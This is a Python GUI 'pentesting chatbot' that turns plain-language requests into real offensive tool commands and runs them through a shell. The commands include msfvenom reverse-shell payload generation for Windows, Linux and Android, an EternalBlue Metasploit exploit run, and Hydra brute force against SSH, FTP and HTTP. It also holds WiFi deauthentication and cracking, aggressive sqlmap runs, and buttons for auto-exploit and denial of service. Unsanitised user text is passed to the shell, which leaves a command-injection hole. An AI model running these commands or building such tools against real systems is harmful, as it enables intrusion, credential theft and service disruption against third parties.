#!/usr/bin/env python3
"""
REAL-TIME PENTESTING CHATBOT GUI
Natural Language Hacking Interface with Actual Tool Execution
WARNING: This executes REAL penetration testing tools - Use only on your own systems
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import sys
import os
import re
import json
import subprocess
import threading
import queue
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
import shlex

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Import framework modules
try:
    from src.config import Config
    from src.reconnaissance import ReconnaissanceModule
    from src.vulnerability_scanner import VulnerabilityScanner
    from src.network_assessor import NetworkAssessor
    from src.web_assessor import WebAssessor
    from src.mobile_assessor import MobileAssessor
    from src.wireless_assessor import WirelessAssessor
    from src.cloud_assessor import CloudAssessor
    from src.exploit_module import ExploitModule
    from src.payload_generator import PayloadGenerator
    from src.social_engineering import SocialEngineer
    from src.iot_assessor import IoTAssessor
    FRAMEWORK_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Some modules not available: {e}")
    FRAMEWORK_AVAILABLE = False

class NaturalLanguageProcessor:
    """Process natural language commands into pentesting actions"""
    
    def __init__(self):
        # Command patterns for different attack types
        self.patterns = {
            'scan': {
                'regex': r'(scan|check|test|analyze|assess|probe|enumerate)',
                'keywords': ['port', 'network', 'service', 'host', 'ip', 'subnet']
            },
            'exploit': {
                'regex': r'(exploit|hack|attack|compromise|pwn|own|break into|penetrate)',
                'keywords': ['vulnerability', 'service', 'system', 'server']
            },
            'web': {
                'regex': r'(web|website|http|https|sql|injection|xss|csrf)',
                'keywords': ['injection', 'vulnerability', 'application', 'api']
            },
            'wireless': {
                'regex': r'(wifi|wireless|wpa|wpa2|handshake|deauth|aircrack)',
                'keywords': ['network', 'password', 'crack', 'capture']
            },
            'mobile': {
                'regex': r'(apk|android|mobile|app|application)',
                'keywords': ['analyze', 'decompile', 'reverse', 'malware']
            },
            'brute': {
                'regex': r'(brute|force|crack|password|dictionary|wordlist)',
                'keywords': ['ssh', 'ftp', 'login', 'credential']
            },
            'payload': {
                'regex': r'(payload|shell|backdoor|reverse|bind|meterpreter)',
                'keywords': ['generate', 'create', 'windows', 'linux']
            },
            'recon': {
                'regex': r'(recon|reconnaissance|information|gather|osint|enum)',
                'keywords': ['subdomain', 'dns', 'whois', 'email']
            }
        }
        
        # Direct tool commands
        self.tools = {
            'nmap': {'cmd': 'nmap', 'type': 'network'},
            'nikto': {'cmd': 'nikto', 'type': 'web'},
            'sqlmap': {'cmd': 'sqlmap', 'type': 'web'},
            'nuclei': {'cmd': 'nuclei', 'type': 'web'},
            'metasploit': {'cmd': 'msfconsole', 'type': 'exploit'},
            'aircrack': {'cmd': 'aircrack-ng', 'type': 'wireless'},
            'john': {'cmd': 'john', 'type': 'crack'},
            'hydra': {'cmd': 'hydra', 'type': 'brute'},
            'gobuster': {'cmd': 'gobuster', 'type': 'web'},
            'ffuf': {'cmd': 'ffuf', 'type': 'web'},
            'burp': {'cmd': 'burpsuite', 'type': 'web'},
            'wireshark': {'cmd': 'wireshark', 'type': 'network'},
            'binwalk': {'cmd': 'binwalk', 'type': 'firmware'},
            'ghidra': {'cmd': 'ghidra', 'type': 'reverse'},
            'gdb': {'cmd': 'gdb', 'type': 'debug'}
        }
    
    def parse_command(self, text: str) -> Dict[str, Any]:
        """Parse natural language into executable command"""
        text_lower = text.lower()
        
        # Extract targets (IPs, domains, URLs)
        targets = self.extract_targets(text)
        
        # Extract file paths
        files = self.extract_files(text)
        
        # Determine attack type
        attack_type = self.determine_attack_type(text_lower)
        
        # Build command
        command = self.build_command(text_lower, attack_type, targets, files)
        
        return {
            'original': text,
            'type': attack_type,
            'targets': targets,
            'files': files,
            'command': command,
            'framework_module': self.get_framework_module(attack_type)
        }
    
    def extract_targets(self, text: str) -> List[str]:
        """Extract IP addresses, domains, and URLs from text"""
        targets = []
        
        # IP addresses
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?\b'
        targets.extend(re.findall(ip_pattern, text))
        
        # URLs
        url_pattern = r'https?://[^\s]+'
        targets.extend(re.findall(url_pattern, text))
        
        # Domains
        domain_pattern = r'\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b'
        domains = re.findall(domain_pattern, text, re.IGNORECASE)
        targets.extend([d for d in domains if d not in targets])
        
        return targets
    
    def extract_files(self, text: str) -> List[str]:
        """Extract file paths from text"""
        files = []
        
        # Common file extensions
        file_pattern = r'[^\s]+\.(?:apk|exe|pdf|zip|txt|pcap|cap|bin|elf|so|dll|jar|war|py|sh|php|asp|jsp)'
        files.extend(re.findall(file_pattern, text, re.IGNORECASE))
        
        # Paths starting with / or ./
        path_pattern = r'(?:\.\/|\/)[^\s]+'
        files.extend(re.findall(path_pattern, text))
        
        return files
    
    def determine_attack_type(self, text: str) -> str:
        """Determine the type of attack from text"""
        # Check for specific tool mentions
        for tool, info in self.tools.items():
            if tool in text:
                return info['type']
        
        # Check patterns
        for attack_type, pattern_info in self.patterns.items():
            if re.search(pattern_info['regex'], text):
                # Check for keywords to confirm
                for keyword in pattern_info['keywords']:
                    if keyword in text:
                        return attack_type
        
        # Default to scan if unclear
        return 'scan'
    
    def build_command(self, text: str, attack_type: str, targets: List[str], files: List[str]) -> str:
        """Build actual command to execute"""
        target = targets[0] if targets else "127.0.0.1"
        
        # Build commands based on attack type and context
        if attack_type == 'scan':
            if 'aggressive' in text or 'intense' in text:
                return f"sudo nmap -A -T4 -p- {target}"
            elif 'quick' in text or 'fast' in text:
                return f"nmap -F {target}"
            elif 'stealth' in text:
                return f"sudo nmap -sS -T2 {target}"
            else:
                return f"nmap -sV -sC {target}"
        
        elif attack_type == 'web':
            if 'sql' in text or 'injection' in text:
                return f"sqlmap -u {target} --batch --risk=3 --level=5"
            elif 'nikto' in text:
                return f"nikto -h {target}"
            elif 'nuclei' in text or 'cve' in text:
                return f"nuclei -u {target} -severity critical,high,medium"
            elif 'directory' in text or 'dir' in text:
                return f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt"
            else:
                return f"nikto -h {target}"
        
        elif attack_type == 'exploit':
            if 'metasploit' in text or 'msf' in text:
                return "msfconsole -q -x 'search type:exploit platform:linux'"
            elif 'eternal' in text:
                return f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run'"
            else:
                return f"searchsploit {target}"
        
        elif attack_type == 'wireless':
            if 'monitor' in text:
                return "sudo airmon-ng start wlan0"
            elif 'scan' in text or 'discover' in text:
                return "sudo airodump-ng wlan0mon"
            elif 'deauth' in text:
                return "sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon"
            elif 'crack' in text and files:
                return f"aircrack-ng -w /usr/share/wordlists/rockyou.txt {files[0]}"
            else:
                return "sudo iwlist wlan0 scan"
        
        elif attack_type == 'brute':
            if 'ssh' in text:
                return f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh"
            elif 'ftp' in text:
                return f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ftp"
            elif 'web' in text or 'http' in text:
                return f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form"
            else:
                return f"john --wordlist=/usr/share/wordlists/rockyou.txt {files[0] if files else 'hash.txt'}"
        
        elif attack_type == 'payload':
            if 'windows' in text:
                return "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe"
            elif 'linux' in text:
                return "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf"
            elif 'android' in text or 'apk' in text:
                return "msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 R > app.apk"
            else:
                return "msfvenom -l payloads"
        
        elif attack_type == 'mobile' and files:
            apk = files[0]
            if 'decompile' in text:
                return f"apktool d {apk}"
            elif 'analyze' in text or 'scan' in text:
                return f"mobsf -f {apk}"
            else:
                return f"aapt dump badging {apk}"
        
        elif attack_type == 'recon':
            if 'subdomain' in text:
                return f"sublist3r -d {target}"
            elif 'dns' in text:
                return f"dnsrecon -d {target}"
            elif 'whois' in text:
                return f"whois {target}"
            else:
                return f"theHarvester -d {target} -b all"
        
        else:
            # Default to nmap scan
            return f"nmap -sV {target}"
    
    def get_framework_module(self, attack_type: str) -> Optional[str]:
        """Get the appropriate framework module for attack type"""
        mapping = {
            'scan': 'network',
            'web': 'web',
            'exploit': 'exploit',
            'wireless': 'wireless',
            'mobile': 'mobile',
            'recon': 'reconnaissance',
            'payload': 'payload'
        }
        return mapping.get(attack_type)

class CommandExecutor(threading.Thread):
    """Execute commands in background thread"""
    
    def __init__(self, command: str, output_callback, use_framework: bool = False, 
                 framework_module: str = None, target: str = None):
        super().__init__(daemon=True)
        self.command = command
        self.output_callback = output_callback
        self.use_framework = use_framework and FRAMEWORK_AVAILABLE
        self.framework_module = framework_module
        self.target = target
        self.process = None
        
    def run(self):
        """Execute the command"""
        try:
            if self.use_framework and self.framework_module:
                self.execute_framework_module()
            else:
                self.execute_shell_command()
        except Exception as e:
            self.output_callback(f"âŒ Error: {str(e)}\n", "error")
    
    def execute_shell_command(self):
        """Execute shell command with real-time output"""
        self.output_callback(f"ğŸš€ Executing: {self.command}\n", "command")
        
        try:
            # Use shell=True for complex commands
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Stream output in real-time
            for line in iter(self.process.stdout.readline, ''):
                if line:
                    # Detect output type for coloring
                    if 'error' in line.lower() or 'fail' in line.lower():
                        self.output_callback(line, "error")
                    elif 'success' in line.lower() or 'found' in line.lower():
                        self.output_callback(line, "success")
                    elif 'warning' in line.lower():
                        self.output_callback(line, "warning")
                    else:
                        self.output_callback(line, "output")
            
            self.process.wait()
            
            if self.process.returncode == 0:
                self.output_callback("âœ… Command completed successfully\n", "success")
            else:
                self.output_callback(f"âš ï¸ Command exited with code {self.process.returncode}\n", "warning")
                
        except subprocess.CalledProcessError as e:
            self.output_callback(f"âŒ Command failed: {e}\n", "error")
        except FileNotFoundError:
            self.output_callback(f"âŒ Tool not found. Install it first.\n", "error")
    
    def execute_framework_module(self):
        """Execute using framework modules"""
        self.output_callback(f"ğŸ”§ Using framework module: {self.framework_module}\n", "info")
        
        try:
            if self.framework_module == 'network':
                assessor = NetworkAssessor()
                result = assessor.scan(self.target, 'external')
                self.display_results(result)
                
            elif self.framework_module == 'web':
                assessor = WebAssessor()
                result = assessor.scan(self.target, tools=['nuclei', 'nikto'])
                self.display_results(result)
                
            elif self.framework_module == 'wireless':
                assessor = WirelessAssessor()
                result = assessor.scan_wifi()
                self.display_results(result)
                
            elif self.framework_module == 'mobile' and self.target:
                assessor = MobileAssessor()
                result = assessor.analyze_apk(self.target)
                self.display_results(result)
                
            elif self.framework_module == 'reconnaissance':
                recon = ReconnaissanceModule()
                result = recon.scan_target(self.target)
                self.display_results(result)
                
            elif self.framework_module == 'exploit':
                exploit = ExploitModule()
                result = exploit.auto_exploit(self.target, {})
                self.display_results(result)
                
        except Exception as e:
            self.output_callback(f"âŒ Framework error: {e}\n", "error")
    
    def display_results(self, results: Dict[str, Any]):
        """Display framework results"""
        if isinstance(results, dict):
            self.output_callback("ğŸ“Š Results:\n", "info")
            for key, value in results.items():
                if isinstance(value, (list, dict)):
                    self.output_callback(f"  {key}: {len(value)} items\n", "output")
                else:
                    self.output_callback(f"  {key}: {value}\n", "output")
    
    def stop(self):
        """Stop the running process"""
        if self.process:
            self.process.terminate()
            self.output_callback("ğŸ›‘ Process terminated\n", "warning")

class RealTimePentestChatbot:
    """Main chatbot GUI for real pentesting"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("ğŸ”¥ REAL-TIME PENETRATION TESTING CHATBOT")
        self.root.geometry("1400x800")
        self.root.configure(bg="#0a0a0a")
        
        # Initialize components
        self.nlp = NaturalLanguageProcessor()
        self.current_executor = None
        self.command_history = []
        self.uploaded_files = []
        
        # Create GUI
        self.setup_gui()
        
        # Display welcome
        self.display_welcome()
        
    def setup_gui(self):
        """Setup the chatbot interface"""
        # Main container
        main_frame = tk.Frame(self.root, bg="#0a0a0a")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        self.create_header(main_frame)
        
        # Chat area
        self.create_chat_area(main_frame)
        
        # Input area
        self.create_input_area(main_frame)
        
        # Side panel
        self.create_side_panel(main_frame)
    
    def create_header(self, parent):
        """Create header with title and status"""
        header = tk.Frame(parent, bg="#1a1a1a", height=80)
        header.pack(fill=tk.X, pady=(0, 10))
        
        # Title
        title = tk.Label(header, 
                        text="ğŸ”¥ REAL-TIME PENETRATION TESTING CHATBOT",
                        font=("Courier New", 20, "bold"),
                        fg="#ff0000",
                        bg="#1a1a1a")
        title.pack(pady=10)
        
        # Subtitle
        subtitle = tk.Label(header,
                           text="Natural Language Hacking Interface | 100% REAL TOOLS | Your Systems Only",
                           font=("Courier New", 12),
                           fg="#00ff00",
                           bg="#1a1a1a")
        subtitle.pack()
        
        # Status
        self.status_label = tk.Label(header,
                                    text="âš¡ READY FOR ATTACK",
                                    font=("Courier New", 10),
                                    fg="#ffff00",
                                    bg="#1a1a1a")
        self.status_label.pack()
    
    def create_chat_area(self, parent):
        """Create main chat display area"""
        # Chat frame
        chat_frame = tk.Frame(parent, bg="#0a0a0a")
        chat_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Chat display
        self.chat_display = scrolledtext.ScrolledText(
            chat_frame,
            wrap=tk.WORD,
            width=100,
            height=35,
            bg="#000000",
            fg="#00ff00",
            insertbackground="#00ff00",
            font=("Courier New", 11),
            padx=10,
            pady=10
        )
        self.chat_display.pack(fill=tk.BOTH, expand=True)
        
        # Configure text tags for colors
        self.chat_display.tag_configure('user', foreground='#00ffff', font=("Courier New", 11, "bold"))
        self.chat_display.tag_configure('bot', foreground='#ff00ff', font=("Courier New", 11, "bold"))
        self.chat_display.tag_configure('command', foreground='#ffff00', font=("Courier New", 10))
        self.chat_display.tag_configure('output', foreground='#00ff00', font=("Courier New", 10))
        self.chat_display.tag_configure('success', foreground='#00ff00', font=("Courier New", 10, "bold"))
        self.chat_display.tag_configure('error', foreground='#ff0000', font=("Courier New", 10, "bold"))
        self.chat_display.tag_configure('warning', foreground='#ffa500', font=("Courier New", 10))
        self.chat_display.tag_configure('info', foreground='#00aaff', font=("Courier New", 10))
    
    def create_input_area(self, parent):
        """Create input area with text entry and buttons"""
        input_frame = tk.Frame(parent, bg="#1a1a1a")
        input_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=(10, 0))
        
        # Input field
        self.input_field = tk.Entry(input_frame,
                                   bg="#000000",
                                   fg="#00ff00",
                                   insertbackground="#00ff00",
                                   font=("Courier New", 12),
                                   relief=tk.FLAT,
                                   bd=10)
        self.input_field.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.input_field.bind('<Return>', lambda e: self.process_command())
        
        # Buttons
        button_frame = tk.Frame(input_frame, bg="#1a1a1a")
        button_frame.pack(side=tk.RIGHT)
        
        # Execute button
        self.execute_btn = tk.Button(button_frame,
                                    text="âš¡ EXECUTE",
                                    command=self.process_command,
                                    bg="#ff0000",
                                    fg="#ffffff",
                                    font=("Courier New", 11, "bold"),
                                    relief=tk.FLAT,
                                    padx=20)
        self.execute_btn.pack(side=tk.LEFT, padx=2)
        
        # Upload file button
        upload_btn = tk.Button(button_frame,
                              text="ğŸ“ UPLOAD",
                              command=self.upload_file,
                              bg="#00ff00",
                              fg="#000000",
                              font=("Courier New", 11, "bold"),
                              relief=tk.FLAT,
                              padx=20)
        upload_btn.pack(side=tk.LEFT, padx=2)
        
        # Stop button
        stop_btn = tk.Button(button_frame,
                            text="ğŸ›‘ STOP",
                            command=self.stop_execution,
                            bg="#ff6600",
                            fg="#ffffff",
                            font=("Courier New", 11, "bold"),
                            relief=tk.FLAT,
                            padx=20)
        stop_btn.pack(side=tk.LEFT, padx=2)
        
        # Clear button
        clear_btn = tk.Button(button_frame,
                             text="ğŸ—‘ï¸ CLEAR",
                             command=self.clear_chat,
                             bg="#333333",
                             fg="#ffffff",
                             font=("Courier New", 11, "bold"),
                             relief=tk.FLAT,
                             padx=20)
        clear_btn.pack(side=tk.LEFT, padx=2)
    
    def create_side_panel(self, parent):
        """Create side panel with quick commands and file list"""
        side_panel = tk.Frame(parent, bg="#1a1a1a", width=300)
        side_panel.pack(side=tk.RIGHT, fill=tk.Y, padx=(10, 0))
        
        # Quick commands
        quick_label = tk.Label(side_panel,
                              text="âš¡ QUICK ATTACKS",
                              font=("Courier New", 12, "bold"),
                              fg="#ff0000",
                              bg="#1a1a1a")
        quick_label.pack(pady=10)
        
        quick_commands = [
            ("ğŸ” Deep Scan", "Perform deep vulnerability scan on target"),
            ("ğŸ’£ Auto Exploit", "Find and exploit all vulnerabilities"),
            ("ğŸŒ Web Attack", "SQL injection and XSS scan on website"),
            ("ğŸ“¡ WiFi Crack", "Crack nearby WiFi networks"),
            ("ğŸ“± APK Hack", "Analyze and exploit Android app"),
            ("ğŸ” Brute Force", "Brute force SSH/FTP passwords"),
            ("ğŸ¯ Metasploit", "Launch Metasploit framework"),
            ("ğŸ’‰ Inject Payload", "Generate and inject reverse shell"),
            ("ğŸ•µï¸ Full Recon", "Complete reconnaissance on target"),
            ("ğŸ”¨ DoS Attack", "Launch denial of service attack")
        ]
        
        for label, command in quick_commands:
            btn = tk.Button(side_panel,
                          text=label,
                          command=lambda c=command: self.quick_command(c),
                          bg="#222222",
                          fg="#00ff00",
                          font=("Courier New", 10),
                          relief=tk.FLAT,
                          width=25,
                          anchor="w")
            btn.pack(pady=2, padx=5, fill=tk.X)
        
        # Uploaded files
        files_label = tk.Label(side_panel,
                              text="ğŸ“ UPLOADED FILES",
                              font=("Courier New", 12, "bold"),
                              fg="#00ff00",
                              bg="#1a1a1a")
        files_label.pack(pady=(20, 10))
        
        # File list
        self.file_listbox = tk.Listbox(side_panel,
                                      bg="#000000",
                                      fg="#00ff00",
                                      font=("Courier New", 9),
                                      height=10)
        self.file_listbox.pack(fill=tk.BOTH, expand=True, padx=5)
    
    def display_welcome(self):
        """Display welcome message"""
        welcome = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         REAL-TIME PENETRATION TESTING CHATBOT INITIALIZED         â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  âš ï¸  WARNING: This tool executes REAL hacking commands!          â•‘
â•‘  âš ï¸  Use ONLY on systems you own or have permission to test!     â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  CAPABILITIES:                                                    â•‘
â•‘  âœ“ Network Scanning & Exploitation (Nmap, Metasploit)           â•‘
â•‘  âœ“ Web Application Hacking (SQLMap, Nikto, Nuclei)              â•‘
â•‘  âœ“ Wireless Network Cracking (Aircrack-ng)                      â•‘
â•‘  âœ“ Password Attacks (Hydra, John)                               â•‘
â•‘  âœ“ Mobile App Analysis (APKTool, MobSF)                         â•‘
â•‘  âœ“ Payload Generation (MSFVenom)                                â•‘
â•‘  âœ“ And much more...                                             â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  USAGE: Type commands in natural language:                       â•‘
â•‘  â€¢ "Scan 192.168.1.1 for vulnerabilities"                       â•‘
â•‘  â€¢ "Hack the website example.com"                               â•‘
â•‘  â€¢ "Crack WiFi password"                                        â•‘
â•‘  â€¢ "Exploit SSH on target.com"                                  â•‘
â•‘  â€¢ "Generate Windows reverse shell"                             â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ”¥ SYSTEM READY. What would you like to hack today?
"""
        self.chat_display.insert(tk.END, welcome, 'bot')
        self.chat_display.see(tk.END)
    
    def process_command(self):
        """Process user command"""
        command = self.input_field.get().strip()
        if not command:
            return
        
        # Display user command
        self.chat_display.insert(tk.END, f"\nğŸ‘¤ YOU: {command}\n", 'user')
        self.chat_display.see(tk.END)
        
        # Clear input
        self.input_field.delete(0, tk.END)
        
        # Update status
        self.status_label.config(text="âš¡ PROCESSING...")
        
        # Parse command
        parsed = self.nlp.parse_command(command)
        
        # Display bot response
        self.chat_display.insert(tk.END, f"ğŸ¤– BOT: Understood. ", 'bot')
        
        if parsed['targets']:
            self.chat_display.insert(tk.END, f"Target: {', '.join(parsed['targets'])}. ", 'bot')
        
        self.chat_display.insert(tk.END, f"Attack type: {parsed['type'].upper()}.\n", 'bot')
        
        # Check for uploaded files if needed
        if parsed['type'] in ['mobile', 'crack'] and not parsed['files'] and self.uploaded_files:
            parsed['files'] = self.uploaded_files
            self.chat_display.insert(tk.END, f"Using uploaded file: {self.uploaded_files[-1]}\n", 'info')
        
        # Execute command
        self.execute_command(parsed)
        
        # Add to history
        self.command_history.append(command)
    
    def execute_command(self, parsed: Dict[str, Any]):
        """Execute the parsed command"""
        # Stop any running command
        if self.current_executor and self.current_executor.is_alive():
            self.stop_execution()
        
        # Update status
        self.status_label.config(text="âš”ï¸ ATTACKING...")
        
        # Create executor
        self.current_executor = CommandExecutor(
            command=parsed['command'],
            output_callback=self.display_output,
            use_framework=FRAMEWORK_AVAILABLE,
            framework_module=parsed['framework_module'],
            target=parsed['targets'][0] if parsed['targets'] else None
        )
        
        # Start execution
        self.current_executor.start()
    
    def display_output(self, text: str, tag: str = "output"):
        """Display command output"""
        self.chat_display.insert(tk.END, text, tag)
        self.chat_display.see(tk.END)
        self.root.update_idletasks()
    
    def quick_command(self, command: str):
        """Execute quick command"""
        self.input_field.delete(0, tk.END)
        self.input_field.insert(0, command)
        self.process_command()
    
    def upload_file(self):
        """Upload file for analysis"""
        filename = filedialog.askopenfilename(
            title="Select file for pentesting",
            filetypes=[
                ("All files", "*.*"),
                ("APK files", "*.apk"),
                ("Capture files", "*.cap *.pcap"),
                ("Binary files", "*.exe *.elf *.bin"),
                ("Text files", "*.txt"),
            ]
        )
        
        if filename:
            self.uploaded_files.append(filename)
            self.file_listbox.insert(tk.END, os.path.basename(filename))
            self.chat_display.insert(tk.END, f"\nğŸ“ File uploaded: {filename}\n", 'info')
            self.chat_display.insert(tk.END, "You can now use commands like 'analyze this file' or 'crack this password file'\n", 'info')
            self.chat_display.see(tk.END)
    
    def stop_execution(self):
        """Stop current execution"""
        if self.current_executor:
            self.current_executor.stop()
            self.status_label.config(text="ğŸ›‘ STOPPED")
            self.chat_display.insert(tk.END, "\nğŸ›‘ Execution stopped by user\n", 'warning')
            self.chat_display.see(tk.END)
    
    def clear_chat(self):
        """Clear chat display"""
        self.chat_display.delete(1.0, tk.END)
        self.display_welcome()
        self.status_label.config(text="âš¡ READY FOR ATTACK")
    
    def run(self):
        """Start the chatbot"""
        self.root.mainloop()

def main():
    """Main entry point"""
    print("=" * 70)
    print("REAL-TIME PENETRATION TESTING CHATBOT")
    print("=" * 70)
    print("âš ï¸  WARNING: This tool executes REAL hacking commands!")
    print("âš ï¸  Use ONLY on systems you own or have permission to test!")
    print("=" * 70)
    
    # Check for root if needed
    if os.geteuid() != 0:
        print("âš ï¸  Some commands may require root privileges.")
        print("   Consider running with sudo for full functionality.")
    
    # Create reports directory
    Path("reports").mkdir(exist_ok=True)
    
    # Launch GUI
    app = RealTimePentestChatbot()
    app.run()

if __name__ == "__main__":
    main()
